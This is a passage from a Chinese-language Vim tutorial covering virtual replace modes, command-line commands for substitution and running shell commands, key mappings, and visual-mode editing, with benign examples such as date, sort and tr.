&lt;p&gt;&lt;strong&gt;gR&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;虚拟替换模式&lt;/strong&gt;，其与替换模式最主要的区别在于，对&amp;lt;Tab&amp;gt;键和换行符的不同处理方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;gr&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;单字符虚拟替换模式&lt;/strong&gt;，在替换光标下的当前字符之后，将自动返回到常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;虚拟替换模式&#34;&gt;虚拟替换模式
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Tab&amp;gt;键&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;替换模式（REPLACE）下，在原有&amp;lt;Tab&amp;gt;键处输入字母&amp;rsquo;a&amp;rsquo;，将&lt;strong&gt;直接替代&amp;lt;Tab&amp;gt;键所占用的所有空格的位置&lt;/strong&gt;&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;https://picx.zhimg.com/v2-ecdbd6903e53640aa3375ecd30287665_b.jpg&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309213229157.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;p&gt;虚拟替换模式（VREPLACE）下，在原有&amp;lt;Tab&amp;gt;键处输入字母&amp;rsquo;a&amp;rsquo;，将&lt;strong&gt;仅仅替代单个空格&lt;/strong&gt;&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;https://picx.zhimg.com/v2-ecdbd6903e53640aa3375ecd30287665_b.jpg&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250310190903275.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;NL&amp;gt;换行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;替换模式（REPLACE）下，输入&amp;lt;Enter&amp;gt;回车键将&lt;strong&gt;增加新行&lt;/strong&gt;：&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214135754.png&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214201236.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;p&gt;虚拟替换模式（VREPLACE）下，输入&amp;lt;Enter&amp;gt;回车键将&lt;strong&gt;用新行替代当前行内容&lt;/strong&gt;（即清空当前行）：&lt;/p&gt;
&lt;center class=&#34;half&#34;&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309214135754.png&#34; width=&#34;300&#34;/&gt;    &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309215042518.png&#34; width=&#34;300&#34;/&gt; &lt;/center&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;命令模式&#34;&gt;命令模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;在命令模式下按下 :（英文冒号）就进入了底线命令模式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;有的命令要输入 / 执行&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;命令模式常用命令&#34;&gt;命令模式常用命令
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:w&lt;/strong&gt; &amp;ndash; 保存文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:q&lt;/strong&gt; &amp;ndash; 退出 Vim 编辑器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:wq&lt;/strong&gt; &amp;ndash; 保存文件并退出 Vim 编辑器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:q!&lt;/strong&gt; &amp;ndash; 强制退出Vim编辑器，不保存修改&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set nu&lt;/strong&gt; &amp;ndash; 显示行号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set nonu&lt;/strong&gt; &amp;ndash; 取消行号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n&lt;/strong&gt; &amp;ndash; 定位到第n行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n1,n2d&lt;/strong&gt; &amp;ndash; 删除行号n1至n2之间的内容（n1和n2都代表数字）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;按 ESC 键可随时退出底线命令模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;命令模式处理文件&#34;&gt;命令模式处理文件
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:w [filename]&lt;/strong&gt; &amp;ndash; 将编辑的数据储存成另一个文件（类似另存新档）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:r [filename]&lt;/strong&gt; &amp;ndash; 在编辑的数据中，读入另一个档案的数据，即将filenam的内容加到光标所在行后面&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:n1,n2 w [filename]&lt;/strong&gt; &amp;ndash; 将 n1 到 n2 的内容储存成 filename&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式搜索文本&#34;&gt;命令模式搜索文本
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;?{目标字符串}&lt;/strong&gt; &amp;ndash; 向光标之&lt;strong&gt;上&lt;/strong&gt;寻找一个目标字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/{目标字符串}&lt;/strong&gt; &amp;ndash; 向光标之&lt;strong&gt;下&lt;/strong&gt;寻找一个目标字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n&lt;/strong&gt; &amp;ndash; 重复前一个搜寻的动作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;N&lt;/strong&gt; &amp;ndash; &lt;strong&gt;反向&lt;/strong&gt;进行前一个搜寻动作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set ic&lt;/strong&gt; &amp;ndash; 编辑器将不会区分大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:set noic&lt;/strong&gt; &amp;ndash; 编辑器将区分大小写&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式替换文本&#34;&gt;命令模式替换文本
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;格式：&lt;/strong&gt;&lt;mark&gt;&lt;strong&gt;:(作用范围)s/{目标}/{替换}(/替换的标志)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;替换的作用范围&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;标志&lt;/th&gt;
          &lt;th&gt;作用&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当前行替换&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;%s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;全文替换&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;n1,n2s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;指定行替换，替换n1到n2间所有行的目标，&lt;strong&gt;n2可以是$，代指最后一行&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&amp;rsquo;&amp;lt;,&amp;rsquo;&amp;gt;s&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;指定区域替换&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;替换的标志&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;标志&lt;/th&gt;
          &lt;th&gt;作用&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;[无]&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;只替换作用范围内，&lt;strong&gt;每行第一次出现&lt;/strong&gt;的目标&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;g&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;一次性替换所有&lt;/strong&gt;作用范围内所有的目标&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;i&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;大小写不敏感查找&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;I&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;大小写敏感查找&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;c&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;对作用范围内的目标&lt;strong&gt;逐个替换&lt;/strong&gt;，替换前需进行确认&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;替换标志可以使用多个，比如/gic&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式执行linux命令&#34;&gt;命令模式执行linux命令
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开终端窗口并打印执行命令的结果，不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用&lt;code&gt;:!bash&lt;/code&gt;打开bash shell并执行命令&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:!date		//执行 date 命令显示时间，执行完命令以后按下键盘上的 Enter 就会返回到文件
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:r ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将shell命令command的结果插入到当前行的下一行&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:r !date		//读取系统时间并插入到当前行的下一行
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;n1,n2 ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将n1至n2行范围内的内容交给命令command处理，并将处理结果替换起始行号和结束行号指定范围中的内容&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:1,4 !sort		//将第1行到第4行的内容进行排序
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以只指定起始行&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:1 !tr &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;a-z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;A-Z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;		//将第1行的小写字母转为大写字母
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以用.表示当前光标所在行&lt;/strong&gt;  &lt;strong&gt;(输入&lt;code&gt;!!&lt;/code&gt;会变成&lt;code&gt;:.!&lt;/code&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:. !tr &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;a-z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;A-Z&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;		//将当前行的小写转为大写
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;n1,n2 w ![command]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将起始行号和结束行号所指定范围的内容作为命令command的输入，不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用&lt;code&gt;:1 w !bash&lt;/code&gt;，将会把第1行的内容作为bash命令来执行并显示结果，而且不会改变当前编辑的文件的内容&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;同样的 &lt;code&gt;: . w !bash&lt;/code&gt;将当前行的内容作为bash命令来执行&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;!!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重新执行最近一次运行过的命令&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;:shell&lt;/strong&gt; / &lt;strong&gt;:terminal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打开命令终端（输入exit结束并返回vim）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用&lt;code&gt;:version&lt;/code&gt;命令（按&lt;code&gt;q&lt;/code&gt;退出），查看是否包含+terminal关键字，以确认是否能使用 &lt;code&gt;:terminal&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;命令模式定义快捷键&#34;&gt;命令模式定义快捷键
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基本格式&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;模式&lt;/th&gt;
          &lt;th&gt;基本格式&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;普通模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:nmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;仅在普通模式下有效，定义普通模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;插入模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:imap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义插入模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;可视模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:vmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义可视模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;命令行模式&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:cmap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;用于定义命令行模式下的快捷键&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;总体映射&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:map &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;定义快捷键，适用于普通、可视、操作和选择模式，但不建议用于有冲突的情况。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;总体不可递归映射&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:noremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;类似&lt;code&gt;:map&lt;/code&gt;，但是不会递归地扩展已经存在的映射，避免意外行为。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;普通模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:nnoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在普通模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;插入模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:inoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在插入模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;可视模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:vnoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在可视模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;缩写&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:ab [缩写] [完整文本]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;输入缩写后空格，自动扩展为完整文本&lt;/strong&gt;。例如：&lt;code&gt;:ab email xxxx@gmail.com&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;什么是&amp;lt;key&amp;gt;？&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;key&amp;gt; 对应的是 ^[A-Z] ， 定义快捷键时使用ctrl+v+[a-z]，使用快捷键时用对应的ctrl+[a-z]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;什么是递归映射？&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nmap j gg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nmap Q j
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果已经做了以上映射，那么按下Q，执行的将是gg而不是j&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了避免以上问题，应该这样定义：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nnoremap j gg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nnoremap Q j
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;几个例子&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:map ^D Ahelloworld&amp;lt;ESC&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;在文件的光标所在行的行尾，添加 helloworld 字符串，按住组合键 ctrl + d 就会执行操作&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:map ^M I#&amp;lt;ESC&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;在文件光标处所在行的行首插入#，按住组合键 ctrl + m 就会执行操作&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:ab email xxxx@gmail.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;输入 email+空格 会把输入的 email 自动替换成 xxxx @gmail.com&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;可视化模式&#34;&gt;可视化模式
&lt;/h3&gt;&lt;h4 id=&#34;进入可视化模式&#34;&gt;进入可视化模式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可视化模式可以分为以下三种：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;v&lt;/strong&gt; &amp;ndash; &lt;strong&gt;字符可视化模式&lt;/strong&gt;，文本选择是以&lt;strong&gt;字符&lt;/strong&gt;为单位的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V&lt;/strong&gt; &amp;ndash; &lt;strong&gt;行可视化模式&lt;/strong&gt;，文本选择是&lt;strong&gt;以行&lt;/strong&gt;为单位的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl-V&lt;/strong&gt; &amp;ndash; &lt;strong&gt;块可视化模式&lt;/strong&gt;，可以选择一个&lt;strong&gt;矩形内&lt;/strong&gt;的文本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在任意可视化模式下使用以上命令，将会切换到对应模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在任意可视化模式下使用I（大写i），将会切换到插入模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;gv&lt;/strong&gt; &amp;ndash; 进入上一次的可视化模式，并选中当时选中的文本**（命令模式也能用此命令）**&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;按 ESC 键可随时退出可视化模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;可视化模式下移动光标&#34;&gt;可视化模式下移动光标
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;命令模式下的光标移动方法仍然适用&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;进入任意可视化模式，移动光标，会从当前位置开始，以相应方式高亮选中字符&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;o&lt;/strong&gt; &amp;ndash;  移动光标到已经选取的文本的&lt;strong&gt;结尾处&lt;/strong&gt;或者&lt;strong&gt;开头处&lt;/strong&gt;（根据现在光标所在位置确定）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;如果是块可视化模式，移动光标到对角处
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;O&lt;/strong&gt; &amp;ndash; 在&lt;strong&gt;块可视化&lt;/strong&gt;模式下，移动光标到&lt;strong&gt;同一行的结尾处或者开头处&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;可视化模式下编辑&#34;&gt;可视化模式下编辑
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;大部分命令模式对内容操作的命令都能在可视化模式下使用，比如：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;d&lt;/strong&gt; &amp;ndash; 删除高亮文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;D&lt;/strong&gt; &amp;ndash; 删除一整行文本，&lt;strong&gt;即使只有一部分被选中了&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;c&lt;/strong&gt; &amp;ndash; 删除高亮文本并进入插入模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;y&lt;/strong&gt; &amp;ndash; 复制高亮文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Y&lt;/strong&gt; &amp;ndash; 复制一整行文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;p&lt;/strong&gt; &amp;ndash; 黏贴复制的文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
